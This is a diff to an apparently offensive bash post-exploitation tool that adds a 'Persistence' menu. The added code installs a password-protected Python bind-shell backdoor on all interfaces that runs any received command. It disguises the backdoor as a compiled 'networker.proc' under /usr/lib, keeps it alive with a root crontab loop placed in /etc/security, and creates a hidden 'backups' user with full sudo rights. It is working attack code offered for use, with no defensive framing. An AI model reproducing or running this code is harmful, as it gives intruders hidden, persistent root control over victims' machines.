@@ -375,6 +375,140 @@ removetarget() {
 }
 
 # ---------------------------
+#         [Persistence]
+# ---------------------------
+function persistence() {
+ while true; do
+    echo -e "
+
+         $Pe [PERSISTENCE] $We
+    "
+    echo -e "
+    1. Return
+    2. Backdoor
+    3. Backup User
+    "
+    read -p "[Option]> " options
+
+    case $options in
+      1)
+        break
+        ;;
+      2)
+        python_backdoor
+        clear
+        echo -e "["$Gn"Backdoor Opened!"$We"]"
+
+        ;;
+      3)
+        backup_user
+        clear
+        echo -e "["$Gn"Backup User Created!"$We"]"
+        ;;
+      *)
+        echo
+        echo -e "$Rd" Invalid Option!"$We"
+        echo
+        read -p " Press any key to continue..."
+        ;;
+    esac
+  done
+}
+
+python_backdoor() {
+echo
+cat << 'EOF' > /usr/lib/networker 
+#!/usr/bin/env python3
+import socket
+import os
+import subprocess
+import traceback
+import threading
+from socket import error as SocketError
+import errno
+LOCALHOST = '0.0.0.0' 
+PORT = DOOR
+banner = (b"""
+          NETWORK SYSTEM
+""")
+class ClientThread(threading.Thread):
+    def __init__(self,clientAddress,clientsocket):
+        threading.Thread.__init__(self)
+        self.csocket = clientsocket
+    def run(self):
+        while True:
+            self.csocket.send(banner)
+            while True:
+                data = self.csocket.recv(1024)
+                if data.decode() == "PASSWORD\n":
+                    self.csocket.send(b"Right!\n")
+                    while True:
+                        data = self.csocket.recv(1024)
+                        self.csocket.send(b"Command: " + data)
+                        command = data.decode()
+                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+                        output = proc.stdout.read()
+                        self.csocket.send(bytes(output))
+                else:
+                    self.csocket.send(b"Error!\n")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((LOCALHOST, PORT))
+while True:
+    s.listen(1000)
+    clientsock, clientAddress = s.accept()
+    newthread = ClientThread(clientAddress, clientsock)
+    newthread.start()
+EOF
+
+# 1. Main script (python3 backdoor)
+# -- Default backdoor folder "/usr/lib/", Can be changed if desired --
+
+read -p " [+] Your listening port: " DOOR
+
+sed -i "s/DOOR/$DOOR/" /usr/lib/networker
+
+read -p " [+] Your password: " PASSWORD
+
+sed -i "s/PASSWORD/$PASSWORD/" /usr/lib/networker
+
+python3 -m py_compile /usr/lib/networker
+
+mv /usr/lib/__pycache__ /usr/lib/networks
+
+mv /usr/lib/networks/networkercpython* /usr/lib/networks/networker.proc
+
+rm /usr/lib/networker
+
+# 2. Maintenance file
+# -- Default file folder "/etc/security/" -- 
+
+cat << 'EOF' > /etc/security/system.conf
+#!/usr/bin/env bash
+while :
+do
+    /usr/bin/python3 /usr/lib/networks/networker.proc
+    sleep 5
+done
+EOF
+
+chmod u+x /etc/security/system.conf
+
+echo "* * * * * root  /usr/bin/env bash /etc/security/system.conf" >> /etc/crontab   
+}
+
+backup_user() {
+        echo
+        name=backups
+        echo -e "$We [+] User: $name"
+        read -p " [+] Password: " password
+        echo -ne "$password\n$password\n\n\n\n" | adduser $name 2>/dev/null
+        echo -ne "\n$name   ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
+        rm -rf /home/backups
+        sed -i 's/:\/home\/backups:/:\/var\/backups:/g' /etc/passwd
+}
+
+# ---------------------------
 #          [BANNER]
 # ---------------------------
 
@@ -430,6 +564,7 @@ options=(
 "DeepSearch"
 "Network"
 "ChacalC2"
+"Persistence"
 )
 
  select var in "${options[@]}"; do
@@ -455,6 +590,10 @@ network
 ;;
 "ChacalC2")
 chacal-c2
+;;
+"Persistence")
+root_check
+persistence
 ;;
 *)
   echo
